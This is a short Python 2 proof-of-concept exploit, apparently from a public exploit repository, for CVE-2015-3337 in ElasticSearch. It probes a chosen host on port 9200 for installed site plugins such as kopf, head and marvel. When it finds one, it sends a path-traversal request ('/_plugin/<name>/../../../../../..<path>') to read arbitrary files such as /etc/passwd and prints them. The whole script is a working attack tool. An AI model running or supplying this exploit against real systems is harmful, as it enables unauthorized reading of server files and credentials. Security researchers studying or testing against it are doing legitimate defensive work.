#!/usr/bin/python
# Crappy PoC for CVE-2015-3337 - Reported by John Heasman of DocuSign
# Affects all ElasticSearch versions prior to 1.5.2 and 1.4.5
# Pedro Andujar || twitter: pandujar || email: @segfault.es || @digitalsec.net
# Tested on default Linux (.deb) install /usr/share/elasticsearch/plugins/
#
# Source: https://github.com/pandujar/elasticpwn/

import socket, sys

print "!dSR ElasticPwn - for CVE-2015-3337\n"
if len(sys.argv) <> 3:
        print "Ex: %s www.example.com /etc/passwd" % sys.argv[0]
        sys.exit()

port = 9200 # Default ES http port
host = sys.argv[1]
fpath = sys.argv[2]

def grab(plugin):
		socket.setdefaulttimeout(3)
		s = socket.socket()
		s.connect((host,port))
		s.send("GET /_plugin/%s/../../../../../..%s HTTP/1.0\n"
			"Host: %s\n\n" % (plugin, fpath, host))
		file = s.recv(2048)
		print "	[*] Trying to retrieve %s:" % fpath
		if ("HTTP/1.0 200 OK" in file):
			print "\n%s" % file
		else:
		    print "[-] File Not Found, No Access Rights or System Not Vulnerable"

def pfind(plugin):
	try:
		socket.setdefaulttimeout(3)
		s = socket.socket()
		s.connect((host,port))
		s.send("GET /_plugin/%s/ HTTP/1.0\n"
			"Host: %s\n\n" % (plugin, host))
		file = s.recv(16)
		print "[*] Trying to find plugin %s:" % plugin
		if ("HTTP/1.0 200 OK" in file):
			print "[+] Plugin found!"
			grab(plugin)
			sys.exit()
		else:
		    print "[-]  Not Found "
	except Exception, e:
		print "[-] Error connecting to %s: %s" % (host, e)
		sys.exit()

# Include more plugin names to check if they are installed
pluginList = ['test','kopf', 'HQ', 'marvel', 'bigdesk', 'head']

for plugin in pluginList:
	pfind(plugin)